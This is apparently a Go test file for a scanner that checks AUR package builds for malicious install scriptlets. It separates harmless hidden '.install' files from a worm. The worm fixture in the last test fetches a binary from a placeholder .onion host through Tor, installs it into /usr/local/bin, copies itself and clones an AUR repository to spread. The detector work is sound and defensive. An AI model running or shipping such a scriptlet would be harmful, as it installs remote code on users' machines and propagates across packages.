package rules

import "testing"

// REF-002 reports a hidden scriptlet as a WARNING, never as proof.
//
// Two earlier versions of this check were wrong. Fatal-on-any-dot would have
// condemned ~120 AUR packages that use a bare .install / .INSTALL as an
// ordinary naming convention. Narrowing it to ".$pkgname.install" rested on a
// base rate rather than a mechanism: each AUR package is its own repository, so
// there is nothing for a filename to collide with, and a worm calling itself
// ".install" replicates just as well while evading the narrow test for free.
func TestHiddenScriptletIsAWarningNotAVerdict(t *testing.T) {
	cases := []struct{ name, pkgbuild string }{
		{"worm-variable", "pkgname=xsnow\ninstall=\".$pkgname.install\""},
		{"worm-literal", "pkgname=xsnow\ninstall=.xsnow.install"},
		{"convention-bare", "pkgname=v2raya\ninstall=.INSTALL"},
		{"convention-quoted", "pkgname=netctl-tray\ninstall=\".install\""},
	}
	for _, c := range cases {
		t.Run(c.name, func(t *testing.T) {
			var hit *Hit
			for i, h := range Scan(map[string]string{"PKGBUILD": c.pkgbuild}) {
				if h.Code == "REF-002" {
					hit = &Scan(map[string]string{"PKGBUILD": c.pkgbuild})[i]
				}
			}
			if hit == nil {
				t.Fatal("REF-002 should report every dot-prefixed scriptlet")
			}
			if hit.Severity != High {
				t.Errorf("severity = %v, want High — concealment is a signal, not proof", hit.Severity)
			}
			if IsFatal("REF-002") {
				t.Error("REF-002 must not be fatal: a filename is not a behaviour")
			}
		})
	}
}

// A conventional .install must not be condemned on its filename alone. The
// scriptlet here does nothing: no floor, so the model decides.
func TestConventionalHiddenScriptletIsClearable(t *testing.T) {
	files := map[string]string{
		"PKGBUILD": "pkgname=v2raya\ninstall=.INSTALL",
		".INSTALL": "post_install(){ echo \"see /usr/share/doc/v2raya\"; }",
	}
	if f := Floor(Scan(files), false); f == "MALICIOUS" {
		t.Fatalf("a hidden but harmless scriptlet must stay clearable, got %q: %v", f, Scan(files))
	}
}

// The worm is still caught — by what its scriptlet DOES, not by its name.
func TestWormCaughtByBehaviourNotFilename(t *testing.T) {
	files := map[string]string{
		"PKGBUILD": "pkgname=xsnow\ninstall=.xsnow.install",
		".xsnow.install": `post_install() {
  curl -x socks5h://127.0.0.1:9050 http://aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaad.onion/m -o /usr/local/bin/m
  chmod +x /usr/local/bin/m
  cp "$BASH_SOURCE" /tmp/copy
  git clone ssh://aur@aur.archlinux.org/x.git
}`,
	}
	if f := Floor(Scan(files), false); f != "MALICIOUS" {
		t.Fatalf("floor = %q, want MALICIOUS from behaviour alone", f)
	}
	// ...and it would still be MALICIOUS with an entirely ordinary filename.
	renamed := map[string]string{
		"PKGBUILD":      "pkgname=xsnow\ninstall=xsnow.install",
		"xsnow.install": files[".xsnow.install"],
	}
	if f := Floor(Scan(renamed), false); f != "MALICIOUS" {
		t.Fatalf("renaming the scriptlet must not help the worm, got %q", f)
	}
}
